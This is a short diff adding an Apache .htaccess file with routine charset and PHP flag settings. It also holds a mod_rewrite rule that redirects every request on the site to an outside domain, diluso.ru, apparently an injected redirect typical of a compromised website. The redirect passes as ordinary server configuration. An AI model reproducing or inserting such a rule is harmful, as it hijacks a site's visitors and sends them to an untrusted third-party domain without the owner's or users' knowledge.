@@ -1,0 +1,9 @@
+AddDefaultCharset UTF-8
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteRule ^(.*)$ http://diluso.ru/
+</IfModule>
+
+php_flag short_open_tag off
+php_flag expose_php Off
+php_flag magic_quotes_gpc Off
